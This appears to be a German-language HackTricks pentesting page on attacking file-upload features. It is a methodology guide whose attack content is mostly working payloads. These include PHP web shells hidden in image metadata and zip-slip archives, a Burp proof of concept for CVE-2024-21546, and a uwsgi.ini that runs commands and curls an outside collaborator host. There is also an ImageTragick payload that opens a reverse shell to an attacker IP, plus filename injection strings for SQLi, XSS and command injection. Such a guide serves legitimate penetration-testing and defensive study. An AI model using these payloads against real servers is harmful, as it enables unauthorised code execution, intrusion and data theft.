# Datei-Upload

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Methodik für Datei-Uploads

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Umgehen von Dateierweiterungsprüfungen

1. Falls vorhanden, prüfe die vorherigen Erweiterungen. Teste sie auch mit einigen Großbuchstaben: _pHp, .pHP5, .PhAr ..._
2. _Überprüfe **das Hinzufügen einer gültigen Erweiterung vor** der Ausführungserweiterung (verwende auch die vorherigen Erweiterungen):_
- _file.png.php_
- _file.png.Php5_
3. Versuche, **spezielle Zeichen am Ende hinzuzufügen.** Du kannst Burp verwenden, um alle **ascii** und **Unicode** Zeichen zu **bruteforce**. (_Beachte, dass du auch versuchen kannst, die **zuvor genannten** **Erweiterungen** zu verwenden_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Versuche, die Schutzmechanismen zu umgehen, indem du den serverseitigen Erweiterungsparser täuschst, mit Techniken wie dem Verdoppeln der Erweiterung oder dem Hinzufügen von Junk-Daten (**null** bytes) zwischen Erweiterungen. _Du kannst auch die **vorherigen Erweiterungen** verwenden, um ein besseres payload vorzubereiten._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Füge eine weitere Ebene von Erweiterungen zur vorherigen Prüfung hinzu:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Versuche, die Ausführungs-Erweiterung vor die gültige Erweiterung zu setzen und hoffe, dass der Server fehlkonfiguriert ist. (nützlich, um Apache-Fehlkonfigurationen auszunutzen, bei denen alles mit der Erweiterung .php, aber nicht unbedingt mit der Endung .php, Code ausführt):
- _ex: file.php.png_
7. Verwendung von **NTFS alternate data stream (ADS)** unter **Windows**. In diesem Fall wird ein Doppelpunkt-Zeichen ":" nach einer verbotenen Erweiterung und vor einer erlaubten eingefügt. Als Ergebnis wird auf dem Server eine **leere Datei mit der verbotenen Erweiterung** erstellt (z. B. "file.asax:.jpg”). Diese Datei kann später mit anderen Techniken bearbeitet werden, z. B. durch Verwendung des kurzen Dateinamens. Das "**::$data**” Muster kann auch verwendet werden, um nicht-leere Dateien zu erstellen. Daher kann das Hinzufügen eines Punktzeichens nach diesem Muster ebenfalls nützlich sein, um weitere Einschränkungen zu umgehen (z. B. "file.asp::$data.”)
8. Versuche, die Dateinamenlimits zu überschreiten. Die gültige Erweiterung wird abgeschnitten. Und das bösartige PHP bleibt übrig. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Einige Upload-Handler trimmen oder normalisieren nachgestellte Punktzeichen aus dem gespeicherten Dateinamen. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) Versionen vor 2.9.1 kannst du die Erweiterungsvalidierung umgehen durch:

- Verwenden eines gültigen Image-MIME-Typs und Magic-Headers (z. B. PNG’s `\x89PNG\r\n\x1a\n`).
- Die hochgeladene Datei mit einer PHP-Erweiterung gefolgt von einem Punkt benennen, z. B. `shell.php.`.
- Der Server entfernt den nachgestellten Punkt und persistiert `shell.php`, das ausgeführt wird, wenn es in einem vom Web bedienten Verzeichnis platziert wird (standardmäßiger public storage wie `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Rufe dann den gespeicherten Pfad auf (typisch bei Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Gegenmaßnahmen:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Durchsetzen strenger serverseitiger allowlists und erneute Validierung des persistierten Dateinamens.
- Uploads aus nicht-ausführbaren Speicherorten bereitstellen.

### Umgehen von Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks, indem man den **value** des **Content-Type** **header** auf setzt: _image/png_, _text/plain_, application/octet-stream
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass der **magic number**-Prüfung, indem man am Anfang der Datei die **bytes of a real image** hinzufügt (verwirrt das _file_ command). Oder die Shell in den **metadata** einbringen:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oder du könntest das **payload direkt** in ein Bild einfügen:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Wenn auf dein Bild **compression** angewendet wird, z. B. durch Standard-PHP-Bibliotheken wie [PHP-GD](https://www.php.net/manual/fr/book.image.php), sind die vorherigen Techniken nicht mehr nützlich. Du könntest jedoch den **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **compression** überlebt.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die Webseite könnte das **image** auch skalieren (z. B. mit den PHP-GD-Funktionen `imagecopyresized` oder `imagecopyresampled`). Du könntest jedoch den **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **compression** übersteht.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Eine weitere Technik, um ein Payload zu erstellen, das ein Bild-Resizing überlebt, nutzt die PHP-GD-Funktion `thumbnailImage`. Du könntest jedoch den **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) verwenden, um Text einzufügen, der die **compression** überlebt.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Weitere Tricks zum Prüfen

- Finde eine Verwundbarkeit, um die bereits hochgeladene Datei zu **rename** (z. B. die Extension zu ändern).
- Finde eine **Local File Inclusion**-Vulnerabilität, um die Backdoor auszuführen.
- **Mögliche Informationsoffenlegung**:
1. Lade dieselbe Datei **mehrfach** (und zur **gleichen Zeit**) mit demselben Namen hoch.
2. Lade eine Datei hoch, deren **name** einer bereits existierenden **file** oder **folder** entspricht.
3. Upload einer Datei mit **"." , ".." oder "…"** als Namen. Zum Beispiel: In Apache unter **Windows**, wenn die Anwendung hochgeladene Dateien im Verzeichnis "/www/uploads/" speichert, erzeugt die Datei mit dem Namen "." eine Datei namens "uploads" im Verzeichnis "/www/".
4. Lade eine Datei hoch, die sich nicht leicht löschen lässt, z. B. **"…:.jpg"** in **NTFS**. (Windows)
5. Lade in **Windows** eine Datei mit **invalid characters** wie `|<>*?”` im Namen hoch. (Windows)
6. Lade in **Windows** eine Datei mit **reserved** (**forbidden**) **names** wie CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 und LPT9 hoch.
- Versuche außerdem, eine **executable** (.exe) oder eine **.html** (weniger verdächtig) hochzuladen, die **Code ausführt**, wenn sie vom Opfer versehentlich geöffnet wird.

### Special extension tricks

Wenn du versuchst, Dateien auf einen **PHP server** hochzuladen, siehe den **.htaccess**-Trick, um Code auszuführen: [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Wenn du Dateien auf einen **ASP server** hochladen willst, siehe den **.config**-Trick, um Code auszuführen: [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar`-Dateien sind wie die `.jar` für Java, aber für php, und können **wie eine php-Datei verwendet werden** (mit php ausgeführt oder in ein Skript inkludiert...).

Die `.inc`-Extension wird manchmal für php-Dateien verwendet, die nur zum **Importieren von Dateien** dienen, sodass jemand zu einem Zeitpunkt diese **Extension zur Ausführung zugelassen haben könnte**.

## **Jetty RCE**

Wenn du eine XML-Datei auf einen Jetty-Server hochladen kannst, kannst du [RCE erhalten, weil **neue \*.xml und \*.war automatisch verarbeitet werden**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1). Daher, wie im folgenden Bild erwähnt, lade die XML-Datei nach `$JETTY_BASE/webapps/` hoch und erwarte die Shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Für eine detaillierte Untersuchung dieser Vulnerability siehe die Originalforschung: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE)-Vulnerabilities können auf uWSGI-Servern ausgenutzt werden, wenn man die Möglichkeit hat, die `.ini`-Konfigurationsdatei zu verändern. uWSGI-Konfigurationsdateien nutzen eine spezifische Syntax, um "magic" Variablen, Platzhalter und Operatoren einzubinden. Insbesondere der '@'-Operator, verwendet als `@(filename)`, ist dazu gedacht, den Inhalt einer Datei einzuschließen. Unter den verschiedenen unterstützten schemes in uWSGI ist das "exec" scheme besonders mächtig, da es das Lesen von Daten aus der Standardausgabe eines Prozesses erlaubt. Diese Funktion kann missbraucht werden, z. B. für Remote Command Execution oder Arbitrary File Write/Read, wenn eine `.ini`-Konfigurationsdatei verarbeitet wird.

Betrachte das folgende Beispiel einer bösartigen `uwsgi.ini`-Datei, die verschiedene schemes demonstriert:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die Ausführung des payloads erfolgt während des Parsings der Konfigurationsdatei. Damit die Konfiguration aktiviert und geparst wird, muss der uWSGI-Prozess entweder neu gestartet werden (möglicherweise nach einem Crash oder aufgrund eines Denial of Service attack) oder die Datei muss auf auto-reload gesetzt sein. Die auto-reload-Funktion, falls aktiviert, lädt die Datei in festgelegten Intervallen neu, sobald Änderungen erkannt werden.

Es ist entscheidend, die nachlässige Natur des Parsings der uWSGI-Konfigurationsdatei zu verstehen. Konkret kann der hier diskutierte payload in eine Binärdatei (wie ein Image oder PDF) eingefügt werden, wodurch sich das potenzielle Exploit-Spektrum weiter erweitert.

## **wget Datei-Upload/SSRF Trick**

In manchen Fällen kann es vorkommen, dass ein Server **`wget`** verwendet, um **Dateien herunterzuladen**, und Sie die **URL** angeben können. In diesen Fällen prüft der Code möglicherweise, ob die Erweiterung der heruntergeladenen Dateien in einer Whitelist enthalten ist, um sicherzustellen, dass nur erlaubte Dateien heruntergeladen werden. Allerdings kann **diese Prüfung umgangen werden.**\  
Die **maximale** Länge eines **Dateinamens** unter **linux** beträgt **255**, jedoch kürzt **wget** die Dateinamen auf **236** Zeichen. Du kannst eine Datei namens **"A"\*232+".php"+".gif"** herunterladen; dieser Dateiname wird die **Prüfung umgehen** (in diesem Beispiel ist **".gif"** eine **gültige** Erweiterung), aber `wget` wird die Datei in **"A"\*232+".php"** umbenennen.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Beachte, dass eine **andere Option**, an die du vielleicht denkst, um diese Prüfung zu umgehen, darin besteht, den **HTTP server redirect to a different file** zu machen, sodass die ursprüngliche URL die Prüfung umgeht und wget anschließend die weitergeleitete Datei mit dem neuen Namen herunterladen würde. Das **funktioniert nicht**, **es sei denn** wget wird mit dem **Parameter** `--trust-server-names` verwendet, weil **wget die weitergeleitete Seite mit dem Namen der Datei herunterladen wird, der in der Original-URL angegeben ist**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) ist ein leistungsstarkes Tool, das Pentesters und Bug Hunters beim Testen von Datei-Upload-Mechanismen unterstützt. Es nutzt verschiedene bug bounty techniques, um den Prozess der Identifikation und Ausnutzung von Schwachstellen zu vereinfachen und umfassende Bewertungen von Webanwendungen zu ermöglichen.

### Korruption von Upload-Indizes durch snprintf quirks (historisch)

Einige veraltete Upload-Handler, die `snprintf()` oder ähnliches verwenden, um Multi-File-Arrays aus einem Single-File-Upload zu erstellen, können dazu gebracht werden, die `_FILES`-Struktur zu fälschen. Aufgrund von Inkonsistenzen und Abschneidung im Verhalten von `snprintf()` kann ein sorgfältig gestalteter Einzel-Upload auf der Serverseite wie mehrere indexierte Dateien erscheinen und Logik verwirren, die eine strikte Form annimmt (z. B. ihn als Multi-File-Upload behandelt und unsichere Zweige wählt). Obwohl heute eher Nische, taucht dieses „index corruption“-Muster gelegentlich in CTFs und älteren Codebasen wieder auf.

## Von File upload zu anderen Schwachstellen

- Setze den **Dateiname** auf `../../../tmp/lol.png` und versuche eine **path traversal**
- Setze den **Dateiname** auf `sleep(10)-- -.jpg` und du könntest eine **SQL injection** erreichen
- Setze den **Dateiname** auf `<svg onload=alert(document.domain)>` um ein **XSS** zu erzielen
- Setze den **Dateiname** auf `; sleep 10;` um einige command injection Tests durchzuführen (mehr [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probiere **verschiedene svg payloads** von [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Wenn du den Webserver anweisen kannst, ein **image** von einer URL zu holen, könntest du versuchen, ein [SSRF](../ssrf-server-side-request-forgery/index.html) auszunutzen. Wenn dieses **image** an einer **public** Stelle gespeichert wird, könntest du auch eine URL von [https://iplogger.org/invisible/](https://iplogger.org/invisible/) angeben und Informationen jedes Besuchers **stehlen**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Speziell gestaltete PDFs für XSS: Die [folgende Seite zeigt, wie man **PDF-Daten injiziert, um JS-Ausführung zu erhalten**](../xss-cross-site-scripting/pdf-injection.md). Wenn du PDFs hochladen kannst, könntest du ein PDF vorbereiten, das beliebiges JS gemäß den dortigen Anweisungen ausführt.
- Lade den \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) Inhalt hoch, um zu prüfen, ob der Server ein **antivirus** hat
- Prüfe, ob es eine **size limit** beim Hochladen von Dateien gibt

Hier ist eine Top-10-Liste von Dingen, die du durch Upload erreichen kannst (von [hier](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Siehe [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) für andere Dateitypen.

## Zip/Tar File Automatically decompressed Upload

Wenn du eine ZIP hochladen kannst, die auf dem Server entpackt wird, kannst du zwei Dinge tun:

### Symlink

Lade ein Archiv hoch, das symbolische Links (soft links) zu anderen Dateien enthält; beim Zugriff auf die entpackten Dateien greifst du dann auf die verlinkten Dateien zu:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### In verschiedene Ordner entpacken

Die unerwartete Erstellung von Dateien in Verzeichnissen während des Entpackens ist ein erhebliches Problem. Trotz anfänglicher Annahmen, dass diese Konfiguration vor OS-level command execution durch malicious file uploads schützen könnte, lassen sich die Unterstützung verschachtelter Komprimierung und die directory traversal-Fähigkeiten des ZIP archive format ausnutzen. Dadurch können Angreifer Beschränkungen umgehen und aus sicheren upload directories entkommen, indem sie die decompression functionality der Zielanwendung manipulieren.

Ein automatisierter exploit zum Erstellen solcher Dateien ist unter [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) verfügbar. Das utility kann wie folgt verwendet werden:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Außerdem ist der **symlink trick with evilarc** eine Option. Wenn das Ziel darin besteht, eine Datei wie `/flag.txt` anzugreifen, sollte ein Symlink zu dieser Datei auf Ihrem System erstellt werden. Dies stellt sicher, dass evilarc während seiner Ausführung nicht auf Fehler stößt.

Unten folgt ein Beispiel für Python-Code, der verwendet wird, um eine bösartige zip-Datei zu erstellen:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Ausnutzen von Kompression für file spraying**

Für weitere Details **siehe den Originalbeitrag unter**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Erstellen einer PHP-Shell**: PHP-Code wird geschrieben, um Befehle aus der Variable `$_REQUEST` auszuführen.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying und Erstellen einer komprimierten Datei**: Mehrere Dateien werden erstellt und ein zip-Archiv wird zusammengestellt, das diese Dateien enthält.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Änderung mit einem Hex-Editor oder vi**: Die Namen der Dateien innerhalb des zip werden mit vi oder einem Hex-Editor verändert, wobei "xxA" in "../" geändert wird, um Verzeichnisse zu traversieren.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Lade diesen Inhalt mit einer Bild-Dateierweiterung hoch, um die Schwachstelle auszunutzen **(ImageMagick , 7.0.1-1)** (aus dem [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Einbetten einer PHP shell in PNG

Das Einbetten einer PHP shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` von PHP-GD sind in diesem Zusammenhang besonders relevant, da sie üblicherweise zum Verkleinern bzw. Resampling von Bildern verwendet werden. Dass die eingebettete PHP shell von diesen Operationen unberührt bleibt, ist für bestimmte Anwendungsfälle ein wesentlicher Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und möglicher Anwendungen, findet sich im folgenden Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Vorgehens und seiner Implikationen.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files fungieren als einzigartiges Werkzeug in der Cybersecurity und verhalten sich wie Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig existieren können. Ein interessantes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien sind nicht auf dieses Paar beschränkt; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von polyglot files liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien anhand des Typs filtern. Üblich ist in vielen Anwendungen, nur bestimmte Dateitypen für Uploads zu erlauben — wie JPEG, GIF oder DOC — um das Risiko durch potenziell gefährliche Formate (z. B. JS, PHP oder Phar) zu reduzieren. Ein Polyglot kann jedoch, indem es die strukturellen Kriterien mehrerer Dateitypen erfüllt, diese Beschränkungen heimlich umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Grenzen. Zum Beispiel kann ein Polyglot gleichzeitig eine PHAR-Datei (PHp ARchive) und ein JPEG darstellen, doch der Erfolg des Uploads kann von den Richtlinien der Plattform bezüglich Dateiendungen abhängen. Wenn das System strikt bei erlaubten Extensions ist, reicht die bloße strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload zu gewährleisten.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Wie man Dateityp-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, obwohl dies nicht erlaubt ist, indem man eine PDF-Datei vortäuscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` magic bytes in den ersten 1024 Bytes sind, ist sie gültig (Beispiel im Beitrag)
- **`pdflib` library**: Füge ein gefälschtes PDF-Format innerhalb eines Felds der JSON hinzu, sodass die Library denkt, es sei ein PDF (Beispiel im Beitrag)
- **`file` binary**: Es kann bis zu 1048576 Bytes aus einer Datei lesen. Erstelle einfach eine JSON, die größer ist als das, sodass sie den Inhalt nicht als JSON parsen kann, und füge dann innerhalb der JSON den Anfangsteil einer echten PDF ein — dann wird sie denken, es sei ein PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
